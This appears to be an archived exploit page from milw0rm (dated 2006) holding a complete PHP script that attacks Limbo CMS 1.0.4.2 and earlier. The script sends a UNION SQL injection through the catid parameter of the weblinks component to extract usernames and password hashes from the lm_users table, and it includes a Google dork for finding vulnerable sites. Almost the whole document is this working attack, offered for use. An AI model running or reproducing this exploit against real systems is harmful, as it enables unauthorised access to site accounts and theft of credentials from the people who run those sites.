<html><head><title>Limbo CMS <= 1.0.4.2 (catid) Remote SQL Injection Exploit</title></head><pre>&lt;pre&gt;
[i] Limbo CMS (option=weblinks) sql injection exploit
[i] coded by [Oo]
&lt;?php

if( (!isset($_GET['host'])) || (!isset($_GET['path'])) || (!isset($_GET['id'])))
{
?&gt;	
[*] Usage: &lt;?echo htmlentities($PHP_SELF)?&gt;?host=[hostname]&amp;path=[limbo_path]&amp;id=[user_id]
[*] Exemple: &lt;?echo htmlentities($PHP_SELF)?&gt;?host=127.0.0.1&amp;path=/limbo&amp;id=1

[g] Google: inurl:&quot;index2.php?option=rss&quot; OR &quot;powered By Limbo CMS&quot;	
&lt;?php
die;
}

$host = $_GET['host'];
$path = $_GET['path'];
$id = $_GET['id'];

$success = 0;

$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
   die(&quot;[-] Connection Error!&quot;);
} 
else {

   $out = &quot;GET $path/index.php?option=weblinks&amp;Itemid=44&amp;catid=-1%20union%20select%200,1,2,concat(char(0x6c,0x6f,0x67,0x69,0x6e,0x3a),username,char(0x20,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x3a),password),4,5,6,7,8,9,10,11%20from%20lm_users%20where%20id=$id/* HTTP/1.1\r\n&quot;;
   $out .= &quot;Host: $host\r\n&quot;;
   $out .= &quot;Connection: Close\r\n\r\n&quot;;

   fwrite($fp, $out);
   while (!feof($fp)) {
	   $f = fgets($fp, 1024);
       if ( (preg_match(&quot;/&lt;div class=\&quot;componentheading\&quot; &gt;/&quot;,$f)) &amp;&amp; (preg_match(&quot;/login/&quot;,$f)) )
       {
			echo &quot;$f&quot;;
			echo &quot;[+] Enjoy! :&gt;&lt;br&gt;&quot;;
			$success = 1;
	   }
   }
   fclose($fp);
   
   if (!$success)
	echo &quot;&lt;br&gt;[-] exploit failed :&lt;&lt;br&gt;&quot;;
}
?&gt; 
&lt;/pre&gt;

# milw0rm.com [2006-05-05]</pre></html>